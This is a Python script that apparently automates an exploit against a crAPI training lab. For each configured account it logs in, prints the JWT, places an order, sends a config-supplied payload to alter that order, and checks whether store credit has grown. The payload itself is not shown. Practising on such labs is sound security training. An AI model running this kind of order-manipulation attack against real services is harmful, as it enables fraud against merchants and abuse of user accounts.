import requests
import json
from pathlib import Path

file_dir_path = Path(__file__).resolve().parent

# Load configurations from config.json
with open(file_dir_path / "config.json", "r") as config_file:
    config = json.load(config_file)


for login in config["logins"]:
    data = {
        "email":login["email"],
        "password":login["password"]
        }
    response = requests.post(config["login_url"], json=data)
    if response.status_code == 200:
        jwt_token = response.json().get("token")
        if jwt_token:
            print("JWT token obtained successfully.")
            print("JWT token:", jwt_token)
        else:
            print("JWT token not found in response.")
    else:
        print("Authentication failed. Status code:", response.status_code)
    headers = {
        "Authorization": f"Bearer {jwt_token}",
        "Content-Type": "application/json"
    }
    response = requests.post(config["target_url"], json=config["buy_payload"], headers=headers)
    response_data = response.json()
    order_id = response_data.get("id")
    credit = response_data.get("credit")
    print("order id is:", order_id, "\nCurrent credit is: ", credit)
    response = requests.put(config["target_url"] + f"/{order_id}", json=config["payload"], headers=headers)
    response = requests.get("http://crapi.bobaklabs.com:8888/workshop/api/shop/products", headers=headers)
    response_data = response.json()
    credit = response_data.get("credit")
    print("Credit after payload is: ", credit)